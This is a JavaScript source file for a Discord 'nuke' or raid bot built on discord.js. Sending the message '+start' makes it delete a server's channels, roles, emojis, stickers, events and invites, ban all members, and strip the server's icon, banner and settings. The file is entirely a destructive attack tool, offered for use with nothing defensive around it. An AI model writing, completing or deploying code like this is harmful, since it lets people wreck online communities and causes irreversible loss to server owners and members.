const { Client } = require('discord.js');
const Raid = require('./helpers/Raid');

const client = new Client({
  intents: [
    'Guilds', 'GuildMembers', 'MessageContent', 'GuildMessages'
  ]
});

client.on('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
  await client.guilds.fetch();
});

client.on('warn', console.log);
client.on('error', console.log);
client.on('debug', console.log);

client.on('messageCreate', async (message) => {
  if (message.content.trim() === '+start') {
    const guild = await client.guilds.fetch(message.guild.id);
    const raid = new Raid(guild, client);
    raid.disableCommunity();
    raid.nukeEmojis();
    raid.nukeStickers();
    raid.nukeScheduledEvents();
    raid.nukeChannels();
    raid.nukeRoles();
    raid.banAllMembers();
    raid.nukeInvites();

    try {
      await guild.setIcon(null);
    } catch (e) {
      console.log(e.message);
    }
    try {
      await guild.setBanner(null);
    } catch (e) {
      console.log(e.message);
    }
    try {
      await guild.setDiscoverySplash(null);
    } catch (e) {
      console.log(e.message);
    }
    try {
      await guild.setWidgetSettings({
        enabled: false
      });
    } catch (e) {
      console.log(e.message);
    }
    try {
      await guild.setDefaultMessageNotifications(0);
    } catch (e) {
      console.log(e.message);
    }
  }
});

client.login('your bot token');
